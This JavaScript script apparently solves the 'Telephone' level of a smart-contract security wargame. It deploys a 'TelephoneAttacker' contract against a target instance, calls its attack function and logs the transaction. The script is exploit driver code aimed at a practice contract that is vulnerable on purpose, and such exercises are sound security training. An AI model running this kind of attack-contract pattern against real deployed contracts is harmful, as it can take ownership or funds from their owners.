const {BLOCK_EXPLORER_URL, TELEPHONE_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
	console.log('Telephone level');

    if (!TELEPHONE_INSTANCE_ADDRESS) {
        console.log('Telephone instance address not found');
        return;
    }

    console.log('Telephone instance address', TELEPHONE_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    const factory = await ethers.getContractFactory("Telephone");
    const contract = factory.attach(TELEPHONE_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("TelephoneAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    const tx = await attackerContract.connect(attacker).attack(attacker.address);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Telephone level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
